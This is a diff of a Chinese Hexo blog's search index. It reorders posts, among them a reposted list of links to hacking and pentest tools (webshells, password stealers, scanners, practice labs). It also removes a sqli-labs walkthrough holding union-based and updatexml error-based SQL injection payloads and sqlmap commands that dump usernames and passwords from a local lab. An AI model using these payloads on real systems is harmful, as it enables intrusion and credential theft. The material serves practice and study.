@@ -13,6 +13,24 @@
       </tags>
   </entry>
   <entry>
+    <title>Hacker_Tools-转</title>
+    <url>/posts/ec585c99/</url>
+    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
+<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
+<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+]]></content>
+      <categories>
+        <category>工具手册</category>
+      </categories>
+      <tags>
+        <tag>工具手册</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS总结</title>
     <url>/posts/9f0502f1/</url>
     <content><![CDATA[<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>把用户输入的数据从服务器反射给用户浏览器，要精心构造payload</p>
@@ -159,24 +177,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hacker_Tools-转</title>
-    <url>/posts/ec585c99/</url>
-    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
-<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
-<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
-<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
-<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
-<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
-<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
-]]></content>
-      <categories>
-        <category>工具手册</category>
-      </categories>
-      <tags>
-        <tag>工具手册</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo基本使用</title>
     <url>/posts/d4fee3ae/</url>
     <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
@@ -219,18 +219,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo阅读全文设置</title>
-    <url>/posts/5605128/</url>
-    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali安装pip2</title>
     <url>/posts/6b338ac1/</url>
     <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
@@ -243,6 +231,18 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo阅读全文设置</title>
+    <url>/posts/5605128/</url>
+    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>phpstudy访问localhost不出现目录的问题</title>
     <url>/posts/2704909e/</url>
     <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="phpstudy1.png"></p>
@@ -252,132 +252,6 @@
       </categories>
       <tags>
         <tag>phpstudy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab1</title>
-    <url>/posts/2b9109b5/</url>
-    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>查字段</p>
-<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39; limit 0,1</code></p>
-<p>1.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>用<code>&#39;</code>闭合</p>
-<p><code>id = 1&#39; --+</code></p>
-<p><code>id =1&#39; order by 4 --+</code> #报错 说明有三个字段</p>
-<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3是输出点</p>
-<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>查表名</p>
-<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> 查字段</p>
-<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> 查账号密码</p>
-<p>SQLmap</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
-<p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
-<p>2.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
-<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
-<br/>
-
-<p>SQLmap</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
-<br/>
-
-<br/>
-
-<p>3.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>用<code>&#39;)</code>闭合</p>
-<p><code>id=1&#39;) and 1=1 --+</code></p>
-<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
-<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
-<p>SQLmap</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
-<br/>
-
-<p>4.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>用<code>&quot;)</code>闭合</p>
-<p>SQLmap</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
-<br/>
-
-<p>5.</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>id=1&#39; --+</code>页面正常 说明用 <code>&#39;</code>闭合</p>
-<p><code>id=1&#39;  and 1=1 --+</code> 有回显</p>
-<p><code>id=1&#39;  and 1=2 --+</code>无回显</p>
-<p>查看代码，发现只要语句执行成功就会返回’You are in ……..’</p>
-<p>可以考虑使用报错注入或者布尔盲注</p>
-<p>报错注入使用<code>updatexml</code></p>
-<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>得到数据库等信息</p>
-<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
-<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
-<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
-<br/>
-
-<p>SQLmap</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #获取数据库信息</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
-<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
-<br/>
-
-<br/>
-
-<p>6.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>使用<code>&quot;</code>闭合</p>
-<p>显错注入</p>
-<p><code>id=1&quot; --+</code></p>
-<p><code>id=1&quot; and 1=1 --+</code></p>
-<p><code>id=1&quot; and 1=2 --+</code></p>
-<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
-<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
-<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
-<br/>
-
-<p>7.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<br/>
-
-<p>8.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<br/>
-
-<p>9.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<p>10.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br/>
-
-<br/>
-
-<p>11.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>SQLi</tag>
       </tags>
   </entry>
   <entry>
@@ -526,18 +400,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用proxychains4gitclone拒绝访问</title>
-    <url>/posts/3a6e39d4/</url>
-    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>个人规划</title>
     <url>/posts/d7c4f825/</url>
     <content><![CDATA[<p>最近一直在考研和就业上有所犹豫，这两天回家呆了几天，仔细想了想，最终还是决定选择就业，不去考研了。在这半年中，要好好准备，等暑假或者开学后去外面实习。在这期间，要好好学习以下一些知识。之前hvv面试了四次，面试前也没再接触这些兑现，再学习高数英语啥的，现在做好决定了，那就认真准备吧~</p>
@@ -610,48 +472,6 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次hw面试经历(1)</title>
-    <url>/posts/40769f33/</url>
